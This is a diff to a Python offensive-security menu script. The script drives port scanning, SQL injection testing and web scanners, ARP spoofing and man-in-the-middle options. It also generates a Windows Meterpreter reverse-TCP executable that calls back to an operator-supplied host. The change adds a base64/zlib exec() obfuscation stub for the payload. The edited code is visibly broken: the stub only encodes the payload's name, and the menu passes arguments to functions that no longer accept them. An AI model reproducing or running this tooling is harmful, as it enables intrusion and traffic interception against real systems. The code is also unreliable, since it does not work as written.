@@ -2,7 +2,8 @@ import os
 import subprocess
 import sys
 import nmap
-
+import base64
+import zlib
 
 def scan(ip):
     nm = nmap.PortScanner()
@@ -18,33 +19,41 @@ def scan(ip):
             for port in lport:
                 print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
 
-
-def dirbust(url):
+def dirbust():
+    url = input("Enter the URL to scan: ")
     print("Directory busting...")
     subprocess.call(['dirb', url])
 
-
-def sqlmap(url):
+def sqlmap():
+    url = input("Enter the URL to scan: ")
     print("SQL injection testing...")
     subprocess.call(['sqlmap', '-u', url])
 
-
-def nikto(url):
+def nikto():
+    url = input("Enter the URL to scan: ")
     print("Web server scanning...")
     subprocess.call(['nikto', '-h', url])
 
-
-def nuclei(url):
+def nuclei():
+    url = input("Enter the URL to scan: ")
     print("Web server scanning...")
     subprocess.call(['nuclei', '-u', url])
-
 
 def msfvenom():
     print("Creating payload...")
     ip = input("Enter your IP address: ")
     port = input("Enter a port: ")
-    os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > payload.exe'.format(ip, port))
-    print("Payload created: payload.exe")
+    payload_name = input("Enter the name of the payload: ")
+    payload = 'windows/meterpreter/reverse_tcp'
+    format = 'exe'
+    encoded_payload = base64.b64encode(payload.encode('utf-8'))
+    compressed_payload = zlib.compress(encoded_payload)
+    encoded_compressed_payload = base64.b64encode(compressed_payload)
+    payload_code = f"import base64,zlib;exec(zlib.decompress(base64.b64decode('{encoded_compressed_payload.decode()}')))"
+    os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format} > {payload_name}.{format}")
+    with open(f'{payload_name}.py', 'w') as f:
+        f.write(payload_code)
+    print("Payload created: {}.{}".format(payload_name, format))
 
 
 def arp():
@@ -69,103 +78,41 @@ def menu():
         print("\nWelcome to the Cyber Killchain Pentesting Suite!\n")
         print("1. Port Scanning")
         print("2. Directory Busting")
-        print("3. SQL Injection Testing")
-        print("4. Web Server Scanning")
-        print("5. Payload Creation")
-        print("6. ARP Spoofing")
-        print("7. MITM Attack")
-        print("8. Combine Scans and Tools")
+        print("3. SQLInjection Testing")
+        print("4. Web Server Scanning with Nikto")
+        print("5. Web Server Scanning with Nuclei")
+        print("6. Generate Metasploit Payload")
+        print("7. ARP Spoofing")
+        print("8. Man-in-the-Middle Attack")
         print("9. Exit\n")
         choice = input("Enter your choice: ")
-
         if choice == '1':
-            ip = input("Enter an IP address to scan: ")
+            ip = input("Enter IP address to scan: ")
             scan(ip)
         elif choice == '2':
-            url = input("Enter a URL to scan: ")
+            url = input("Enter URL: ")
             dirbust(url)
         elif choice == '3':
-            url = input("Enter a URL to test: ")
+            url = input("Enter URL: ")
             sqlmap(url)
         elif choice == '4':
-            url = input("Enter a URL to scan: ")
+            url = input("Enter URL: ")
             nikto(url)
         elif choice == '5':
-            msfvenom()
+            url = input("Enter URL: ")
+            nuclei(url)
         elif choice == '6':
-            arp()
+            msfvenom()
         elif choice == '7':
-            mitm()
+            arp()
         elif choice == '8':
-            combine()
+            mitm()
         elif choice == '9':
-            print("Goodbye!")
+            print("Exiting...")
             sys.exit()
         else:
-            print("Invalid choice. Please try again.")
+            print("Invalid choice, please try again.")
 
 
-def combine():
-    while True:
-        print("\nWelcome to the Cyber Killchain Pentesting Suite!\n")
-        print("1. Port Scanning")
-        print("2. Directory Busting")
-        print("3. SQL Injection Testing")
-        print("4. Web Server Scanning")
-        print("5. Payload Creation")
-        print("6. ARP Spoofing")
-        print("7. MITM Attack")
-        print("8. Exit\n")
-        choice = input("Enter your choice: ")
-
-        if choice == '1':
-            ip = input("Enter an IP address to scan: ")
-            scan(ip)
-        elif choice == '2':
-            url = input("Enter a URL to scan: ")
-            dirbust(url)
-        elif choice == '3':
-            url = input("Enter a URL to test: ")
-            sqlmap(url)
-        elif choice == '4':
-            url = input("Enter a URL to scan: ")
-            nikto(url)
-        elif choice == '5':
-            msfvenom()
-        elif choice == '6':
-            arp()
-        elif choice == '7':
-            mitm()
-        elif choice == '8':
-            print("Goodbye!")
-            sys.exit()
-        elif choice == '9':
-            choice = input("Enter the numbers of the tools you want to combine (separated by commas): ")
-            choices = choice.split(",")
-            for c in choices:
-                if c == '1':
-                    ip = input("Enter an IP address to scan: ")
-                    scan(ip)
-                elif c == '2':
-                    url = input("Enter a URL to scan: ")
-                    dirbust(url)
-                elif c == '3':
-                    url = input("Enter a URL to test: ")
-                    sqlmap(url)
-                elif c == '4':
-                    url = input("Enter a URL to scan: ")
-                    nikto(url)
-                elif c == '5':
-                    msfvenom()
-                elif c == '6':
-                    arp()
-                elif c == '7':
-                    mitm()
-                else:
-                    print("Invalid choice. Please try again.")
-        else:
-            print("Invalid choice. Please try again.")
-
-
-if __name__ == __name__:
+if __name__ == '__main__':
     menu()
